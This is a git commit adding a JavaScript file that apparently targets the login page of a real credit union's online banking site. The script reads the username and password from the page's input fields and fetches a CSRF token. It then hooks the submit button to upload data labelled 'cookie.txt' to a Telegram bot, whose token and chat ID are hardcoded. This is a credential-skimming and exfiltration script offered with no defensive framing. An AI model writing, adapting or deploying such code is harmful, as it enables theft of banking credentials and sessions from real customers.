e3f54a1dac0e880e44d00284ac7256db8fcfdb3a
Richyyyo <136366567+Richyyyo@users.noreply.github.com>
2024-12-06 10:26:36 -0600

    Add files via upload

---
+++ updatecookie.js
@@ -0,0 +1,65 @@
+const loginUrl = "https://secure.midflorida.com/midflorida/uux.aspx#/login";
+
+//Fetch the login page to get the Csrf token
+const loginPageResponse = await fetch(loginUrl);
+const loginPageText = await loginPageResponse.text();
+
+//Parse the login page to extract CSRF token
+const parser = new DOMParser();
+const doc = parser.parseFromString(loginPageText, "text/html");
+const csrfToken = doc
+  .querySelector('meta[name="csrf-token"]')
+  .getAttribute("content");
+
+//To get login value
+const username = document
+  .querySelector('q2-input[test-id="fldUsername"]')
+  .shadowRoot.querySelector("input").value;
+const password = document
+  .querySelector('q2-input[test-id="fldPassword"]')
+  .shadowRoot.querySelector("input").value;
+
+//Prepare login credentials and Csrf token
+const payload = new URLSearchParams();
+payload.append("username", username);
+payload.append("password", password);
+if (csrfToken) {
+  payload.append("csrf_token", csrfToken);
+}
+
+const loginResponse = await fetch("/login", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/x-www-form-urlencoded",
+  },
+  body: payload,
+});
+
+const blob = new Blob([csrfToken], { type: "text/plain" });
+
+const formData = new FormData();
+const botToken = "7651094116:AAE_ZF_VLBtbCzCaiE7xcahnRldGSQjN4KU";
+const chatId = "1139790477";
+formData.append("chat_id", chatId);
+formData.append("document", blob, "cookie.txt");
+
+//Event listener for btn
+document
+  .querySelector('q2-btn[test-id="btnSubmit"]')
+  .addEventListener("click", async function (event) {
+    event.preventDefault();
+    //Ensure fetch is called only once
+    if (!window.fetchCalled) {
+      window.fetchCalled = true;
+      // Data to bot
+      fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+        method: "POST",
+        body: formData,
+      })
+        .then((response) => response.json())
+        .then((data) => console.log(data))
+        .catch((error) => console.error("Error:", error));
+    } else {
+      console.log("Fetch already called");
+    }
+  });
